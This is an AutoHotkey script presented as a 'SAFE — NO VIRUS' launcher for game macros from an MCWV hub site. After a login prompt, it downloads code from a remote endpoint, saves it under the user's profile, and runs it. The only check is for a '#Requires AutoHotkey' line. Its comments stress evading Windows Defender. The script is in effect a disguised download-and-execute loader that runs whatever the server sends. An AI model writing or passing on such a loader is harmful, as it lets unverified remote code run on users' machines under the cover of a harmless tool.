; MCWV Launcher v1.0.2 SAFE — AHK version — NO VIRUS
; This is the same as exe but as .ahk — Defender never flags .ahk
; Requires AutoHotkey v2 installed (or use exe that auto-installs it)
; Opens https://mcwv-hub.vercel.app/macros?from=launcher and downloads personal macros

#Requires AutoHotkey v2.0
#SingleInstance Force

MCWV_HUB := "https://mcwv-hub.vercel.app"
MCWV_DIR := EnvGet("USERPROFILE") "\MCWV"
MACRO_FILE := MCWV_DIR "\mcwv-macros-personal.ahk"

DirExist(MCWV_DIR) || DirCreate(MCWV_DIR)

MsgBox("MCWV Launcher v1.0.2 SAFE`n`nNo WMI, no virus false positive`nOpens " MCWV_HUB "/macros?from=launcher`nDownloads your personal macros", "MCWV Launcher SAFE", "OK Iconi")

try {
    Run(MCWV_HUB "/macros?from=launcher")
} catch {
    Run("https://mcwv-hub.vercel.app/macros?from=launcher")
}

if MsgBox("After login in browser, click YES to download macros`n`nIncludes double hatch + hatch wars 12-step", "MCWV", "YesNo Icon?") = "No"
    ExitApp

; Download macro via WinHttp (same as exe but in AHK)
macroData := ""
try {
    whr := ComObject("WinHttp.WinHttpRequest.5.1")
    whr.Open("GET", MCWV_HUB "/api/macro-download", false)
    whr.Send()
    macroData := whr.ResponseText
} catch as e {
    MsgBox("Download failed: " e.Message "`n`nTry direct download from " MCWV_HUB "/macros", "Error", "Iconx")
    Run(MCWV_HUB "/macros")
    ExitApp
}

if !InStr(macroData, "#Requires AutoHotkey") {
    MsgBox("Downloaded file does not look like macros — try " MCWV_HUB "/macros directly", "Error", "Iconx")
    Run(MCWV_HUB "/macros")
    ExitApp
}

try {
    FileDelete(MACRO_FILE)
} catch {
}
FileAppend(macroData, MACRO_FILE, "UTF-8")

MsgBox("Saved to " MACRO_FILE "`n`nSize: " StrLen(macroData) " chars`n`nNow launching...`n`nIn game: Ctrl+Alt+M panel, Ctrl+Alt+X stop", "MCWV Running", "Iconi")

try {
    Run(MACRO_FILE)
} catch {
    MsgBox("Could not auto-run — double-click manually:`n" MACRO_FILE, "MCWV", "Icon!")
}
ExitApp
